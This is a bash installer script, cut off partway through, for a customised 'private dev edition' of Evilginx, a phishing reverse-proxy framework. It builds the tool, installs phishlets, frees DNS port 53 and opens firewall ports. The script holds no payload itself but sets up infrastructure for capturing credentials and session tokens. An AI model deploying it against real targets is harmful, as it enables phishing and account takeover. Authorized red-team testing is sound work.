#!/bin/bash

#############################################################################
# Evilginx 3.3.1 - Private Dev Edition - One-Click Installer
#############################################################################
# This script automates the complete installation and configuration process
# Based on: DEPLOYMENT_GUIDE.md
#
# Supports: Ubuntu 20.04/22.04/24.04, Debian 11/12
# Architectures: amd64, arm64
#
# What this script does:
# - Installs all dependencies (Go, tools, etc.)
# - Builds Evilginx from source
# - Removes/disables conflicting services
# - Configures firewall rules
# - Creates systemd service
# - Sets up automatic startup
#
# Usage:
#   sudo ./install.sh              # Full installation
#   sudo ./install.sh --upgrade    # Rebuild + reinstall only
#   sudo ./install.sh --uninstall  # Remove Evilginx
#   sudo ./install.sh --dry-run    # Show what would be done
#   ./install.sh --help            # Show usage
#
# Author: AKaZA (Akz0fuku)
# Version: 3.0.0
#############################################################################

set -e  # Exit on error
trap 'log_error "Installation failed at line $LINENO (exit code $?)"; exit 1' ERR

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

#############################################################################
# Helper Functions (defined early so they are available during setup)
#############################################################################

log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

log_error() {
    echo -e "${RED}[✗]${NC} $1"
}

log_step() {
    echo -e "\n${CYAN}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}▶ $1${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}\n"
}

#############################################################################
# Script Directory & Configuration
#############################################################################

# Get script directory - handle both direct execution and sudo execution
if [[ -n "${BASH_SOURCE[0]}" ]]; then
    SCRIPT_PATH="${BASH_SOURCE[0]}"
else
    SCRIPT_PATH="$0"
fi

# Resolve to absolute path
if [[ "$SCRIPT_PATH" = /* ]]; then
    # Already absolute
    SCRIPT_DIR="$(dirname "$SCRIPT_PATH")"
else
    # Relative path - resolve it
    SCRIPT_DIR="$(cd "$(dirname "$SCRIPT_PATH")" && pwd)"
fi

# Final fallback: if still empty or doesn't exist, use current directory
if [[ -z "$SCRIPT_DIR" ]] || [[ ! -d "$SCRIPT_DIR" ]]; then
    SCRIPT_DIR="$(pwd)"
fi

# Configuration
GO_VERSION="1.24.0"
INSTALL_DIR="/usr/local/bin"
INSTALL_BASE="/opt/evilginx"
SERVICE_USER="evilginx"  # Dedicated service user (least-privilege)
CONFIG_DIR="/etc/evilginx"
LOG_DIR="/var/log/evilginx"
PHISHLETS_DIR="/opt/evilginx/phishlets"
REDIRECTORS_DIR="/opt/evilginx/redirectors"
INSTALL_LOG=""

# Detect architecture early (log_warning is now defined above)
ARCH=$(dpkg --print-architecture 2>/dev/null || echo "amd64")
case "$ARCH" in
    amd64|x86_64) GO_ARCH="amd64" ;;
    arm64|aarch64) GO_ARCH="arm64" ;;
    armhf|armv7l)  GO_ARCH="armv6l" ;;
    *)             GO_ARCH="amd64"; log_warning "Unknown arch '$ARCH', defaulting to amd64" ;;
esac

# Distro-specific variables (set by detect_os)
DISTRO_ID=""
DISTRO_VER=""

#############################################################################
# Utility Functions
#############################################################################

# Consolidated function to find the Evilginx root directory
# Replaces duplicate search logic that was in both main() and build_evilginx()
find_evilginx_root() {
    local search_dirs=("$SCRIPT_DIR" "$(pwd)" "$HOME/Evilginx3" "/root/Evilginx3")
    for dir in "${search_dirs[@]}"; do
        if [[ -n "$dir" ]] && [[ -d "$dir" ]] && [[ -f "$dir/main.go" ]]; then
            echo "$dir"
            return 0
        fi
    done
    return 1
}

print_banner() {
    echo -e "${PURPLE}"
    cat << "EOF"
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║     ███████╗██╗   ██╗██╗██╗      ██████╗ ██╗███╗   ██╗██╗  ██╗  ║
║     ██╔════╝██║   ██║██║██║     ██╔════╝ ██║████╗  ██║╚██╗██╔╝  ║
║     █████╗  ██║   ██║██║██║     ██║  ███╗██║██╔██╗ ██║ ╚███╔╝   ║
║     ██╔══╝  ╚██╗ ██╔╝██║██║     ██║   ██║██║██║╚██╗██║ ██╔██╗   ║
║     ███████╗ ╚████╔╝ ██║███████╗╚██████╔╝██║██║ ╚████║██╔╝ ██╗  ║
║     ╚══════╝  ╚═══╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝  ║
║                                                                   ║
║              One-Click Installer - Private Dev Edition           ║
║                         Version 3.3.1                             ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_error "This script must be run as root!"
        log_info "Please run: sudo $0"
        exit 1
    fi
    log_success "Running as root"
}

ensure_git() {
    if ! command -v git &>/dev/null; then
        log_info "Installing git (required)..."
        apt-get update -qq && apt-get install -y -qq git
        log_success "git installed"
    fi
}

detect_os() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$NAME
        VER=$VERSION_ID
        DISTRO_ID="$ID"
        DISTRO_VER="$VER"
        log_info "Detected OS: $OS $VER ($ARCH)"
        
        # Check if supported
        if [[ "$ID" != "ubuntu" ]] && [[ "$ID" != "debian" ]]; then
            log_warning "This script is optimized for Ubuntu/Debian"
            log_warning "Detected: $ID - Installation may fail"
            read -p "Continue anyway? (y/N): " -n 1 -r
            echo
            if [[ ! $REPLY =~ ^[Yy]$ ]]; then
                exit 1
            fi
        fi

        # Ubuntu-specific: suppress needrestart prompts (22.04+)
        if [[ "$ID" == "ubuntu" ]]; then
            export NEEDRESTART_MODE=a
            export NEEDRESTART_SUSPEND=1
        fi
    else
        log_error "Cannot detect OS. /etc/os-release not found"
        exit 1
    fi
}

confirm_installation() {
    echo -e "${YELLOW}"
    cat << EOF

⚠️  WARNING: This installer will make significant system changes:

   1. Install Go $GO_VERSION ($GO_ARCH) and dependencies
   2. Stop and disable Apache2/Nginx (if installed)
   3. Configure UFW firewall (ports 22, 53, 80, 443)
   4. Create directories with admin privileges
   5. Install Evilginx to: $INSTALL_DIR
   6. Create systemd service: evilginx.service
   7. Enable automatic startup

⚠️  LEGAL NOTICE:
   This tool is for AUTHORIZED SECURITY TESTING ONLY.
   Unauthorized use is ILLEGAL and UNETHICAL.
   You are responsible for compliance with all applicable laws.

EOF
    echo -e "${NC}"
    
    read -p "Do you have WRITTEN AUTHORIZATION to deploy this tool? (yes/NO): " -r
    if [[ ! $REPLY =~ ^[Yy][Ee][Ss]$ ]]; then
        log_error "Installation cancelled. Authorization required."
        exit 1
    fi
    
    read -p "Proceed with installation? (yes/NO): " -r
    if [[ ! $REPLY =~ ^[Yy][Ee][Ss]$ ]]; then
        log_error "Installation cancelled by user"
        exit 1
    fi
}

# Pre-flight connectivity and resource checks
preflight_check() {
    log_step "Pre-flight Checks"
    
    # Test internet connectivity
    if ! curl -s --max-time 10 https://go.dev > /dev/null 2>&1; then
        log_error "Cannot reach go.dev — check internet connectivity"
        log_error "Go download will fail without internet access"
        exit 1
    fi
    log_success "Internet connectivity OK (go.dev reachable)"
    
    # Test DNS resolution
    if command -v host &>/dev/null; then
        if ! host go.dev > /dev/null 2>&1; then
            log_warning "DNS resolution may be impaired — installation may have issues"
        else
            log_success "DNS resolution OK"
        fi
    fi
    
    # Check disk space (need at least 2GB free)
    local free_space_mb
    free_space_mb=$(df / --output=avail -BM 2>/dev/null | tail -1 | tr -d 'M ' || echo "0")
    if [[ "$free_space_mb" -lt 2048 ]]; then
        log_warning "Low disk space: ${free_space_mb}MB free (recommended: 2048MB+)"
    else
        log_success "Disk space OK (${free_space_mb}MB free)"
    fi
}

#############################################################################
# Uninstall Function
#############################################################################

uninstall_evilginx() {
    log_step "Uninstalling Evilginx"
    
    # Stop and disable service
    if systemctl is-active --quiet evilginx 2>/dev/null; then
        log_info "Stopping Evilginx service..."
        systemctl stop evilginx
        log_success "Service stopped"
    fi
    
    if systemctl is-enabled --quiet evilginx 2>/dev/null; then
        log_info "Disabling Evilginx service..."
        systemctl disable evilginx
        log_success "Service disabled"
    fi
    
    # Kill any running processes
    if pgrep -x evilginx >/dev/null 2>&1; then
        log_info "Killing running Evilginx processes..."
        pkill -9 evilginx
        sleep 1
        log_success "Processes terminated"
    fi
    
    # Remove service file
    if [ -f /etc/systemd/system/evilginx.service ]; then
        log_info "Removing systemd service file..."
        rm -f /etc/systemd/system/evilginx.service
        systemctl daemon-reload
        log_success "Service file removed"
    fi
    
    # Remove installation directory
    if [ -d "$INSTALL_BASE" ]; then
        log_info "Removing $INSTALL_BASE..."
        rm -rf "$INSTALL_BASE"
        log_success "Installation directory removed"
    fi
    
    # Remove wrapper and helper scripts
    log_info "Removing scripts from /usr/local/bin/..."
    rm -f /usr/local/bin/evilginx
    rm -f /usr/local/bin/evilginx-start
    rm -f /usr/local/bin/evilginx-stop
    rm -f /usr/local/bin/evilginx-restart
    rm -f /usr/local/bin/evilginx-status
    rm -f /usr/local/bin/evilginx-logs
    rm -f /usr/local/bin/evilginx-console
    log_success "Scripts removed"
    
    # Remove config directory (prompt user)
    if [ -d "$CONFIG_DIR" ]; then
        read -p "Remove configuration directory $CONFIG_DIR? This includes certs and DB. (y/N): " -n 1 -r
        echo
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            rm -rf "$CONFIG_DIR"
            log_success "Configuration directory removed"
        else
            log_info "Configuration directory preserved"
        fi
    fi
    
    # Remove log directory
    if [ -d "$LOG_DIR" ]; then
        rm -rf "$LOG_DIR"
        log_success "Log directory removed"
    fi
    
    # Remove Go PATH drop-in (if created by us)
    if [ -f /etc/profile.d/golang.sh ]; then
        read -p "Remove Go PATH configuration (/etc/profile.d/golang.sh)? (y/N): " -n 1 -r
        echo
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            rm -f /etc/profile.d/golang.sh
            log_success "Go PATH drop-in removed"
        else
            log_info "Go PATH drop-in preserved"
        fi
    fi
    
    echo ""
    log_success "Evilginx uninstalled successfully"
    echo ""
    log_info "Note: Go runtime, UFW rules, and Fail2Ban config were NOT removed"
    log_info "Note: systemd-resolved was NOT re-enabled (run 'systemctl unmask systemd-resolved' if needed)"
}

#############################################################################
# Installation Steps
#############################################################################

update_system() {
    log_step "Step 1: Updating System Packages"
    
    apt-get update -qq
    log_success "Package lists updated"
    
    # Only update, don't upgrade — avoids kernel surprises and needrestart hangs
    log_info "Skipping full system upgrade (run 'apt upgrade' manually if desired)"
}

install_dependencies() {
    log_step "Step 2: Installing Dependencies"
    
    log_info "Installing essential packages..."
    DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
        curl \
        wget \
        git \
        vim \
        ufw \
        fail2ban \
        htop \
        net-tools \
        build-essential \
        ca-certificates \
        gnupg \
        lsb-release \
        tar \
        gzip \
        openssl \
        screen \
        tmux \
        dnsutils \
        iptables 2>/dev/null || true
    
    # iptables-persistent can conflict with nftables on newer systems
    if [[ "$DISTRO_ID" == "debian" ]] && [[ "${DISTRO_VER%%.*}" -ge 12 ]]; then
        log_info "Skipping iptables-persistent on Debian 12+ (nftables is default)"
    elif [[ "$DISTRO_ID" == "ubuntu" ]] && [[ "${DISTRO_VER%%.*}" -ge 24 ]]; then
        log_info "Skipping iptables-persistent on Ubuntu 24+ (nftables is default)"
    else
        DEBIAN_FRONTEND=noninteractive apt-get install -y -qq iptables-persistent 2>/dev/null || true
    fi
    
    log_success "Essential packages installed"
}

install_go() {
    log_step "Step 3: Installing Go $GO_VERSION ($GO_ARCH)"
    
    # Remove apt-installed Go if present (Ubuntu ships old versions)
    if [[ "$DISTRO_ID" == "ubuntu" ]]; then
        if dpkg -l golang-go 2>/dev/null | grep -q '^ii'; then
            log_info "Removing apt-installed Go to avoid conflicts..."
            apt-get remove -y golang-go golang 2>/dev/null || true
        fi
    fi
    
    # Check if correct Go is already installed
    if command -v go &> /dev/null; then
        INSTALLED_VERSION=$(go version | awk '{print $3}' | sed 's/go//')
        if [[ "$INSTALLED_VERSION" == "$GO_VERSION" ]]; then
            log_success "Go $GO_VERSION already installed"
            return 0
        else
            log_info "Removing old Go version: $INSTALLED_VERSION"
            rm -rf /usr/local/go
        fi
    fi
    
    local GO_TARBALL="go${GO_VERSION}.linux-${GO_ARCH}.tar.gz"
    
    log_info "Downloading Go $GO_VERSION for $GO_ARCH..."
    cd /tmp
    wget -q --show-progress "https://go.dev/dl/${GO_TARBALL}"
    
    # Verify download integrity
    log_info "Verifying download integrity..."
    
    if [[ ! -f "$GO_TARBALL" ]]; then
        log_error "Go download failed — file not found!"
        exit 1
    fi
    
    local actual_size
    actual_size=$(stat -c%s "$GO_TARBALL" 2>/dev/null || stat -f%z "$GO_TARBALL" 2>/dev/null || echo "0")
    if [[ "$actual_size" -lt 50000000 ]]; then
        log_error "Downloaded Go tarball is too small (${actual_size} bytes, expected 50MB+)"
        log_error "Download may be corrupted or intercepted"
        rm -f "$GO_TARBALL"
        exit 1
    fi
    
    if ! gzip -t "$GO_TARBALL" 2>/dev/null; then
        log_error "Downloaded file is not a valid gzip archive — possibly corrupted"
        rm -f "$GO_TARBALL"
        exit 1
    fi
    
    log_success "Download verified (${actual_size} bytes, valid gzip)"
    
    log_info "Extracting Go..."
    tar -C /usr/local -xzf "$GO_TARBALL"
    
    # Add to PATH using /etc/profile.d/ drop-in (clean, single-location approach)
    # This replaces the old method of writing to /etc/profile, /etc/environment,
    # /root/.bashrc, and $HOME/.bashrc — all of which is unnecessary
    log_info "Adding Go to system PATH via /etc/profile.d/..."
    
    cat > /etc/profile.d/golang.sh << 'GOEOF'
# Go language PATH configuration (managed by Evilginx installer)
export PATH=$PATH:/usr/local/go/bin
GOEOF
    chmod +x /etc/profile.d/golang.sh
    
    # Export for current session
    export PATH=$PATH:/usr/local/go/bin
    
    # Cleanup
    rm -f "$GO_TARBALL"
    
    log_success "Go $GO_VERSION ($GO_ARCH) installed successfully"
    log_success "Go added to PATH via /etc/profile.d/golang.sh (all users, all login shells)"
    /usr/local/go/bin/go version
    
    # Return to original directory
    cd - > /dev/null
}

create_service_user() {
    log_step "Creating Dedicated Service User"
    
    if id "$SERVICE_USER" &>/dev/null; then
        log_success "Service user '$SERVICE_USER' already exists"
        return 0
    fi
    
    useradd --system \
        --shell /usr/sbin/nologin \
        --home-dir "$INSTALL_BASE" \
        --no-create-home \
        --comment "Evilginx service account" \
        "$SERVICE_USER"
    
    log_success "Created service user '$SERVICE_USER' (no login shell)"
}

create_admin_user() {
    log_step "Admin User Setup (Optional)"
    
    echo ""
    log_info "You are currently logged in as root."
    log_info "It is recommended to create a separate admin user for VPS management."
    echo ""
    read -r -p "$(echo -e "${CYAN}Create an admin user for SSH/management? [y/N]: ${NC}")" CREATE_ADMIN
    
    if [[ ! "$CREATE_ADMIN" =~ ^[Yy]$ ]]; then
        log_info "Skipping admin user creation (you can do this later)"
        return 0
    fi
    
    # Get username
    read -r -p "$(echo -e "${CYAN}Enter admin username [evilginx-admin]: ${NC}")" ADMIN_USER
    ADMIN_USER="${ADMIN_USER:-evilginx-admin}"
    
    # Check if user already exists
    if id "$ADMIN_USER" &>/dev/null; then
        log_warning "User '$ADMIN_USER' already exists"
        # Ensure sudo group membership
        usermod -aG sudo "$ADMIN_USER" 2>/dev/null || true
        log_success "Ensured '$ADMIN_USER' is in sudo group"
        return 0
    fi
    
    # Create user with home directory and bash shell
    useradd --create-home \
        --shell /bin/bash \
        --groups sudo \
        --comment "Evilginx admin operator" \
        "$ADMIN_USER"
    
    log_success "Created admin user '$ADMIN_USER'"
    
    # SSH key setup
    echo ""
    read -r -p "$(echo -e "${CYAN}Set up SSH key authentication? [Y/n]: ${NC}")" SETUP_SSH_KEY
    
    if [[ ! "$SETUP_SSH_KEY" =~ ^[Nn]$ ]]; then
        ADMIN_SSH_DIR="/home/$ADMIN_USER/.ssh"
        mkdir -p "$ADMIN_SSH_DIR"
        chmod 700 "$ADMIN_SSH_DIR"
        
        # Check if root has authorized_keys to copy
        if [[ -f /root/.ssh/authorized_keys ]] && [[ -s /root/.ssh/authorized_keys ]]; then
            cp /root/.ssh/authorized_keys "$ADMIN_SSH_DIR/authorized_keys"
            log_success "Copied root's SSH keys to $ADMIN_USER"
        else
            echo ""
            log_info "Paste your SSH public key (or press Enter to skip):"
            read -r SSH_PUB_KEY
            if [[ -n "$SSH_PUB_KEY" ]]; then
                echo "$SSH_PUB_KEY" > "$ADMIN_SSH_DIR/authorized_keys"
                log_success "SSH key added"
            else
                log_warning "No SSH key added — you'll need to set a password"
            fi
        fi
        
        chmod 600 "$ADMIN_SSH_DIR/authorized_keys" 2>/dev/null || true
        chown -R "$ADMIN_USER:$ADMIN_USER" "$ADMIN_SSH_DIR"
    fi
    
    # Set password (as fallback or primary auth)
    echo ""
    read -r -p "$(echo -e "${CYAN}Set a password for '$ADMIN_USER'? [y/N]: ${NC}")" SET_PASSWD
    if [[ "$SET_PASSWD" =~ ^[Yy]$ ]]; then
        passwd "$ADMIN_USER"
    fi
    
    # Offer to disable root SSH login
    echo ""
    read -r -p "$(echo -e "${CYAN}Disable root SSH login for security? [y/N]: ${NC}")" DISABLE_ROOT
    if [[ "$DISABLE_ROOT" =~ ^[Yy]$ ]]; then
        sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
        systemctl restart sshd 2>/dev/null || systemctl restart ssh 2>/dev/null || true
        log_success "Root SSH login disabled"
        log_warning "From now on, SSH in as: ssh $ADMIN_USER@$(hostname -I | awk '{print $1}')"
    fi
    
    echo ""
    log_success "Admin user '$ADMIN_USER' is ready"
    log_info "Login: ssh $ADMIN_USER@$(hostname -I | awk '{print $1}')"
    log_info "Use 'sudo' for privileged operations"
}

setup_directories() {
    log_step "Step 4: Creating Directories"
    
    # Create necessary directories
    mkdir -p "$INSTALL_BASE"
    mkdir -p "$CONFIG_DIR"
    mkdir -p "$LOG_DIR"
    
    # Set ownership to dedicated service user
    chown -R "$SERVICE_USER:$SERVICE_USER" "$CONFIG_DIR"
    chown -R "$SERVICE_USER:$SERVICE_USER" "$LOG_DIR"
    chown -R "$SERVICE_USER:$SERVICE_USER" "$INSTALL_BASE"
    
    log_success "Directories created and owned by $SERVICE_USER"
}

stop_conflicting_services() {
    log_step "Step 5: Stopping Conflicting Services"
    
    # Stop Evilginx if it's running
    log_info "Checking for running Evilginx instances..."
    if systemctl is-active --quiet evilginx 2>/dev/null; then
        log_info "Stopping Evilginx service..."
        systemctl stop evilginx
        sleep 2
        log_success "Evilginx service stopped"
    fi
    
    # Kill any running evilginx processes
    if pgrep -x evilginx >/dev/null; then
        log_info "Killing running Evilginx processes..."
        pkill -9 evilginx
        sleep 2
        log_success "Evilginx processes terminated"
    fi
    
    # Stop other conflicting services
    SERVICES=("apache2" "nginx" "bind9" "named" "systemd-resolved")
    
    for service in "${SERVICES[@]}"; do
        if systemctl is-active --quiet "$service" 2>/dev/null; then
            log_info "Stopping $service..."
            systemctl stop "$service"
            systemctl disable "$service"
            log_success "Stopped and disabled: $service"
        else
            log_info "$service not running (OK)"
        fi
    done
}

disable_systemd_resolved() {
    log_step "Step 5.1: Disabling systemd-resolved (Port 53 Conflict)"
    
    # Check if systemd-resolved is installed
    if ! systemctl list-unit-files | grep -q systemd-resolved.service 2>/dev/null; then
        log_success "systemd-resolved is not installed - no action needed"
        log_info "Port 53 is available for Evilginx DNS server"
        return 0
    fi
    
    log_warning "systemd-resolved detected - will disable to free port 53"
    
    # Stop systemd-resolved
    if systemctl is-active --quiet systemd-resolved 2>/dev/null; then
        log_info "Stopping systemd-resolved service..."
        systemctl stop systemd-resolved || log_warning "Failed to stop systemd-resolved"
        log_success "systemd-resolved stopped"
    fi
    
    # Disable from auto-start
    if systemctl is-enabled --quiet systemd-resolved 2>/dev/null; then
        log_info "Disabling systemd-resolved from auto-start..."
        systemctl disable systemd-resolved || log_warning "Failed to disable systemd-resolved"
        log_success "systemd-resolved disabled"
    fi
    
    # Mask to prevent activation
    log_info "Masking systemd-resolved to prevent activation..."
    systemctl mask systemd-resolved 2>/dev/null || log_warning "Failed to mask systemd-resolved"
    
    # Ubuntu-specific: Disable DNS stub listener to prevent port 53 conflicts after reboot
    if [[ "$DISTRO_ID" == "ubuntu" ]] && [ -f /etc/systemd/resolved.conf ]; then
        log_info "Disabling DNS stub listener (Ubuntu-specific)..."
        sed -i 's/^#\?DNSStubListener=yes/DNSStubListener=no/' /etc/systemd/resolved.conf
        # Also add if not present at all
        if ! grep -q "^DNSStubListener" /etc/systemd/resolved.conf; then
            echo "DNSStubListener=no" >> /etc/systemd/resolved.conf
        fi
        log_success "DNS stub listener disabled in resolved.conf"
    fi
    
    # Handle /etc/resolv.conf
    log_info "Configuring /etc/resolv.conf..."
    
    # Capture existing search domains before deleting anything
    SEARCH_DOMAINS=$(grep "^search" /etc/resolv.conf 2>/dev/null || true)
    if [[ -n "$SEARCH_DOMAINS" ]]; then
        log_info "Preserving search domains: $SEARCH_DOMAINS"
    fi

    # Remove immutable attribute if set
    chattr -i /etc/resolv.conf 2>/dev/null || true
    
    # Backup existing resolv.conf
    if [ -f /etc/resolv.conf ]; then
        cp /etc/resolv.conf /etc/resolv.conf.backup.$(date +%Y%m%d_%H%M%S) 2>/dev/null || true
    fi
    
    # Remove symlink if it exists
    if [ -L /etc/resolv.conf ]; then
        log_info "Removing /etc/resolv.conf symlink..."
        rm -f /etc/resolv.conf 2>/dev/null || true
    fi
    
    # Create static resolv.conf — use proper error handling (not dead $? check)
    if ! cat > /etc/resolv.conf 2>/dev/null << RESOLVEOF
# Static DNS configuration for Evilginx
# systemd-resolved disabled to free port 53

${SEARCH_DOMAINS}

# Google Public DNS
nameserver 8.8.8.8
nameserver 8.8.4.4

# Cloudflare DNS (backup)
nameserver 1.1.1.1

# Options
options timeout:2
options attempts:3
RESOLVEOF
    then
        log_warning "Failed to create /etc/resolv.conf - file may be protected"
        log_info "DNS resolution should still work via existing configuration"
        log_info "If DNS issues occur, manually configure /etc/resolv.conf after installation"
    else
        log_success "Static /etc/resolv.conf created with public DNS servers"
    fi
    
    log_success "systemd-resolved disabled - Port 53 available for Evilginx"

    # Fix: Ensure hostname is resolvable in /etc/hosts
    log_info "Verifying hostname resolution..."
    CURRENT_HOSTNAME=$(hostname)
    
    if [ -n "$CURRENT_HOSTNAME" ]; then
        if ! grep -q "127.0.0.1.*$CURRENT_HOSTNAME" /etc/hosts && ! grep -q "127.0.1.1.*$CURRENT_HOSTNAME" /etc/hosts; then
            log_info "Adding hostname '$CURRENT_HOSTNAME' to /etc/hosts..."
            
            # Backup hosts file
            cp /etc/hosts /etc/hosts.backup.$(date +%Y%m%d_%H%M%S) 2>/dev/null || true
            
            # Append to hosts
            echo "127.0.1.1 $CURRENT_HOSTNAME" >> /etc/hosts
            log_success "Hostname added to /etc/hosts"
        else
            log_success "Hostname '$CURRENT_HOSTNAME' already resolvable in /etc/hosts"
        fi
    fi
}

build_evilginx() {
    log_step "Step 6: Building and Installing Evilginx"
    
    # Use consolidated find_evilginx_root() instead of duplicated search logic
    local BUILD_DIR
    BUILD_DIR=$(find_evilginx_root) || {
        log_error "Cannot find main.go!"
        log_error "Searched directories:"
        log_error "  - $SCRIPT_DIR"
        log_error "  - $(pwd)"
        log_error "  - $HOME/Evilginx3"
        log_error "  - /root/Evilginx3"
        log_error ""
        log_error "Please run: cd ~/Evilginx3 && sudo ./install.sh"
        exit 1
    }
    
    # Change to build directory
    cd "$BUILD_DIR"
    log_info "Building from: $(pwd)"
    
    # Build
    log_info "Downloading Go dependencies..."
    /usr/local/go/bin/go mod download
    
    log_info "Compiling Evilginx..."
    /usr/local/go/bin/go build -o build/evilginx main.go
    
    if [[ ! -f "$BUILD_DIR/build/evilginx" ]]; then
        log_error "Build failed - binary not created"
        exit 1
    fi
    
    log_success "Evilginx compiled successfully"
    
    # Create installation directories
    log_info "Installing to system directories..."
    mkdir -p "$INSTALL_BASE"
    mkdir -p "$LOG_DIR"
    mkdir -p "$CONFIG_DIR"
    
    # Remove old binaries if they exist (after stopping services)
    if [ -f "$INSTALL_BASE/evilginx.bin" ]; then
        log_info "Removing old binary..."
        rm -f "$INSTALL_BASE/evilginx.bin"
    fi
    if [ -f "/usr/local/bin/evilginx" ]; then
        log_info "Removing old wrapper script..."
        rm -f "/usr/local/bin/evilginx"
    fi
    
    # Copy binary to /opt/evilginx (actual binary location)
    log_info "Installing binary to $INSTALL_BASE..."
    cp "$BUILD_DIR/build/evilginx" "$INSTALL_BASE/evilginx.bin"
    chmod +x "$INSTALL_BASE/evilginx.bin"
    
    # Clean and copy phishlets and redirectors (prevents stale files from prior installs)
    log_info "Installing phishlets and redirectors (clean copy)..."
    rm -rf "$INSTALL_BASE/phishlets" "$INSTALL_BASE/redirectors"
    cp -r "$BUILD_DIR/phishlets" "$INSTALL_BASE/"
    cp -r "$BUILD_DIR/redirectors" "$INSTALL_BASE/"
    
    # Create wrapper script with default paths at /usr/local/bin/evilginx
    log_info "Creating system-wide wrapper script..."
    cat > /usr/local/bin/evilginx << 'WRAPPEREOF'
#!/bin/bash
# Evilginx wrapper script with default paths
# Automatically loads phishlets and redirectors from system directories

# Default paths
PHISHLETS_PATH="/opt/evilginx/phishlets"
REDIRECTORS_PATH="/opt/evilginx/redirectors"
CONFIG_PATH="/etc/evilginx"

# Check if user provided paths, otherwise use defaults
ARGS=()
HAS_P_FLAG=false
HAS_T_FLAG=false
HAS_C_FLAG=false

while [[ $# -gt 0 ]]; do
    case $1 in
        -p)
            HAS_P_FLAG=true
            ARGS+=("$1" "$2")
            shift 2
            ;;
        -t)
            HAS_T_FLAG=true
            ARGS+=("$1" "$2")
            shift 2
            ;;
        -c)
            HAS_C_FLAG=true
            ARGS+=("$1" "$2")
            shift 2
            ;;
        *)
            ARGS+=("$1")
            shift
            ;;
    esac
done

# Add default paths if not provided
if [ "$HAS_P_FLAG" = false ]; then
    ARGS=("-p" "$PHISHLETS_PATH" "${ARGS[@]}")
fi
if [ "$HAS_T_FLAG" = false ]; then
    ARGS=("-t" "$REDIRECTORS_PATH" "${ARGS[@]}")
fi
if [ "$HAS_C_FLAG" = false ]; then
    ARGS=("-c" "$CONFIG_PATH" "${ARGS[@]}")
fi

# Run evilginx binary with constructed arguments
exec /opt/evilginx/evilginx.bin "${ARGS[@]}"
WRAPPEREOF
    chmod +x /usr/local/bin/evilginx
    
    # Copy all documentation
    log_info "Copying documentation to $INSTALL_BASE..."
    cp "$BUILD_DIR/README.md" "$INSTALL_BASE/" 2>/dev/null || true
    cp "$BUILD_DIR/DEPLOYMENT_GUIDE.md" "$INSTALL_BASE/" 2>/dev/null || true
    cp "$BUILD_DIR/BEST_PRACTICES.md" "$INSTALL_BASE/" 2>/dev/null || true
    cp "$BUILD_DIR/SESSION_FORMATTING_GUIDE.md" "$INSTALL_BASE/" 2>/dev/null || true
    cp "$BUILD_DIR/LINUX_VPS_SETUP.md" "$INSTALL_BASE/" 2>/dev/null || true
    cp "$BUILD_DIR/TELEGRAM_NOTIFICATIONS.md" "$INSTALL_BASE/" 2>/dev/null || true
    cp "$BUILD_DIR/NEW_PHISHLETS_GUIDE.md" "$INSTALL_BASE/" 2>/dev/null || true
    cp "$BUILD_DIR/PATH_AUTO_DETECTION.md" "$INSTALL_BASE/" 2>/dev/null || true
    chmod -R 755 "$PHISHLETS_DIR"
    chmod -R 755 "$REDIRECTORS_DIR"
    chown -R "$SERVICE_USER:$SERVICE_USER" "$INSTALL_BASE"
    
    log_success "Files installed to $INSTALL_DIR"
    log_success "System-wide command 'evilginx' is now available"
}

configure_firewall() {
    log_step "Step 7: Configuring Firewall (UFW)"
    
    # Don't reset — preserve existing rules (critical for cloud instances)
    log_info "Adding firewall rules (preserving existing rules)..."
    
    # Set default policies (only if not already set)
    ufw default deny incoming 2>/dev/null || true
    ufw default allow outgoing 2>/dev/null || true
    
    # Allow SSH (port 22) — always add first to prevent lockouts
    log_info "Allowing SSH (port 22/tcp)..."
    ufw allow 22/tcp comment 'SSH access' 2>/dev/null || true
    
    # Allow HTTP (port 80)
    log_info "Allowing HTTP (port 80/tcp)..."
    ufw allow 80/tcp comment 'HTTP - ACME challenges' 2>/dev/null || true
    
    # Allow HTTPS (port 443)
    log_info "Allowing HTTPS (port 443/tcp)..."
    ufw allow 443/tcp comment 'HTTPS - Evilginx proxy' 2>/dev/null || true
    
    # Allow DNS (port 53)
    log_info "Allowing DNS (port 53/tcp and 53/udp)..."
    ufw allow 53/tcp comment 'DNS TCP - Evilginx nameserver' 2>/dev/null || true
    ufw allow 53/udp comment 'DNS UDP - Evilginx nameserver' 2>/dev/null || true
    
    # Enable UFW (if not already enabled)
    if ! ufw status | grep -q "Status: active"; then
        log_info "Enabling firewall..."
        echo "y" | ufw enable
    else
        log_info "Firewall already active, rules added"
    fi
    
    log_success "Firewall configured"
    
    # Show status
    echo ""
    ufw status numbered
    echo ""
}

configure_fail2ban() {
    log_step "Step 8: Configuring Fail2Ban"
    
    if [[ ! -f /etc/fail2ban/jail.local ]]; then
        cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
        log_success "Created /etc/fail2ban/jail.local"
    fi
    
    # Determine backend based on distro
    # Debian 12+ and Ubuntu 24+ may not have /var/log/auth.log without rsyslog
    F2B_BACKEND=""
    F2B_LOGPATH="logpath = /var/log/auth.log"
    
    if [[ "$DISTRO_ID" == "debian" ]] && [[ "${DISTRO_VER%%.*}" -ge 12 ]]; then
        if [ ! -f /var/log/auth.log ]; then
            F2B_BACKEND="backend = systemd"
            F2B_LOGPATH="logpath = %(sshd_log)s"
            log_info "Using systemd backend for Fail2Ban (Debian 12+)"
        fi
    fi
    
    # Configure SSH protection
